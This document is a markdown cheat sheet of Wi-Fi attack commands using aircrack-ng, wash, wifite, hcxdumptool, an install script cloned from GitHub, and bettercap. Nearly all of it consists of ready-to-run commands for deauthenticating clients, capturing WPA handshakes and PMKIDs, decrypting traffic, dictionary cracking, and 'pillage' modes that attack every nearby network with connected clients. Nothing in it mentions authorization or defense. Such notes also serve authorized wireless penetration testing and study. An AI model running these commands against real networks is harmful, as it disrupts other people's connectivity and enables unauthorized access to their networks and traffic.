# Wifi Sniffing

## Airmon:

	airmon-ng
	airmon-ng start wlan0mon
	airmon-ng stop wlan0mon
	airmon-ng start wlan0mon 9 (channel 9)
	
Disable all network services for monitor mode:

	airmon-ng check kill

## Airodump:

	airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk wlan0mon

## Aireplay:

	aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 wlan0mon

## Airdecap-ng:

	airdecap-ng -e 'the ssid' -p passphrase  tkip.cap

The capture file must contain a valid four-way handshake. For this purpose having (packets 2 and 3) or (packets 3 and 4) will work correctly. In fact, you don't truly need all four handshake packets.

As well, only data packets following the handshake will be decrypted. This is because information is required from the handshake in order to decrypt the data packets.

## Wash:

Can be used to know if WPS is actived on router

	sudo wash -i wlan0mon

## Wifite:

Automated tools to get all the handshakes of network we scan.

Can be use with other softwares to send the handshakes in a special format on a website to crack the WI-FI password using a lot of connected servers.

	sudo wifite --dict '/home/kali/Downloads/custom-smprepchar-app0-100.txt' --clients-only --power 27 --bully --wps --infinite -p 30

### Infinite mode:

 Loop and continue after each attack. (scan 60 sec)

	sudo wifite -inf -mac -p 60 --kill --clients-only --no-wps --no-pmkid --skip-crack

### Pillage mode: 

Attack all wireless with connected clients after 5 minutes scan.

	sudo wifite -mac -p 300 --kill --clients-only --no-wps --no-pmkid --skip-crack

## Hxcdump:

Use Hxcdump to Capture PMKIDs from Local Networks

	sudo airmon-ng start wlan0
	
	sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

## Lazy Script:

	cd (back to user folder)
	git clone https://github.com/arismelachroinos/lscript.git
	cd lscript
	chmod +x install.sh
	./install.sh
	

## Bettercap:

Get handshakes easily for all networks

	sudo bettercap --iface wlan1mon
	help wifi
	wifi.recon on (wifi sniffing)
	wifi.show
	wifi.deauth all (interface deauthentification)
	set wifi.handshakes '/desiredfolderlocation' (choose directory for hanhshakes)

	wifi.assoc all (PMKID Attack) (use all or MAC address)
	wifi.show
